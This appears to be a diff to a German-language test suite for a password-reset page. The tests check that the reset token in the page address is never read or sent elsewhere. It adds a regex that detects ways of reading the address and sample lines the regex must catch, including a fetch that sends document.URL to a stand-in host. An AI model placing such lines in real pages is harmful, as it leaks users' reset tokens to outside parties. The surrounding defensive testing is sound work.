@@ -184,6 +184,15 @@ describe('/reset-password — der Token steht nur an den erwarteten Stellen', ()
     'if (!canSubmit || !token) return',
     'const { error } = await authClient.resetPassword({ newPassword: password, token })',
   ]
+  /**
+   * Andere Wege an die Adresse samt Token: über das Dokument, über einen
+   * berechneten Schlüssel oder über die Navigations-Messung. Der Syntaxbaum
+   * fände `document.URL` nicht über den Namen `location`, darum hier im
+   * Rohtext (strenger: auch ein Kommentar schlüge an).
+   */
+  const ADRESSE_UEBER_DAS_DOKUMENT =
+    /\bdocument\s*\.\s*(?:URL|documentURI|baseURI|location)\b|\[\s*['"`]location['"`]\s*\]|getEntriesByType\s*\(\s*['"`]navigation['"`]/
+
   /** Die Adresse selbst geht nirgends hin — sonst trüge sie den Token mit. */
   const ADRESS_ZEILEN = [
     'const searchParams = useSearchParams()',
@@ -204,7 +213,7 @@ describe('/reset-password — der Token steht nur an den erwarteten Stellen', ()
     expect(zeilenMit(seite, 'searchParams')).toEqual([])
   })
 
-  it('die Adresse wird genau einmal gelesen, ohne Umbenennung; `location` steht in keinem Passwort-Formular', () => {
+  it('die Adresse wird genau einmal gelesen, ohne Umbenennung; weder `location` noch das Dokument (URL, documentURI, baseURI) in einem Passwort-Formular', () => {
     const formular = lies(FORMULAR)
     expect(aufrufe(formular, 'useSearchParams')).toBe(1)
     expect(zeilenMit(formular, 'useSearchParams')).toEqual([
@@ -213,6 +222,7 @@ describe('/reset-password — der Token steht nur an den erwarteten Stellen', ()
     ])
     for (const datei of PASSWORT_FORMULARE) {
       expect(zeilenMit(lies(datei), 'location'), datei).toEqual([])
+      expect(lies(datei), datei).not.toMatch(ADRESSE_UEBER_DAS_DOKUMENT)
     }
     // „Passwort vergessen" braucht die Adresse gar nicht.
     expect(aufrufe(lies(PASSWORT_FORMULARE[1]), 'useSearchParams')).toBe(0)
@@ -229,6 +239,16 @@ describe('/reset-password — der Token steht nur an den erwarteten Stellen', ()
       "window.location.href = '/x'",
     ]) {
       expect(zeilenMit(`${formular}\n${zusatz}`, 'location'), zusatz).not.toEqual([])
+    }
+    // Wege ohne den Namen `location` (Nachprüfung Runde 2: `document.URL` war aus der Prüfung gefallen).
+    for (const zusatz of [
+      "void fetch('//host/?u=' + encodeURIComponent(document.URL))",
+      'void fetch(document.documentURI)',
+      'void fetch(document.baseURI)',
+      "void fetch(window['location'].href)",
+      "void fetch(String(performance.getEntriesByType('navigation')[0]))",
+    ]) {
+      expect(`${formular}\n${zusatz}`, zusatz).toMatch(ADRESSE_UEBER_DAS_DOKUMENT)
     }
   })
 
